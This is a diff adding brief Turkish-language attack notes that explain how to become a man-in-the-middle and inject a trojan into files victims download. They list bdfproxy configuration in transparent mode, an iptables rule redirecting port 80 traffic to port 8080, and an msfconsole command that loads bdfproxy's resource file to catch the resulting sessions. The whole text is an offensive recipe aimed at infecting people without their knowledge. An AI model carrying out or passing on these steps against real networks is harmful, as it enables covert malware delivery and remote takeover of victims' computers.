@@ -1,0 +1,15 @@
+Bu saldırıyı yapmak için ortadaki adam olmamız lazım.
+İnsanlar bir dosya indirirken o dosya içerisine trojanımızı yerleştireceğiz bu sayede insanlar farketmeden trojanımızı indirmiş olacaklar.
+
+leafpad /etc/bdfproxy/bdfproxy.cfg  -> config dosyasını açar.
+
+Aşağıda işletim sistemleri için özellikler var. Hangi sisteme saldıracaksanız onun ayarlarını değiştirmeniz gerekir. 
+
+proxyMode = transparent  -> olmalıdır.
+
+
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080	-> 80'den gelen bağlantıyı 8080'e yönlendiriyoruz.
+
+bdfproxy -> programı çalıştırır.
+
+msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc -> bdfproxy buraya kayıt eder bizde msfconsole ile bu dosyayı dinliyoruz.
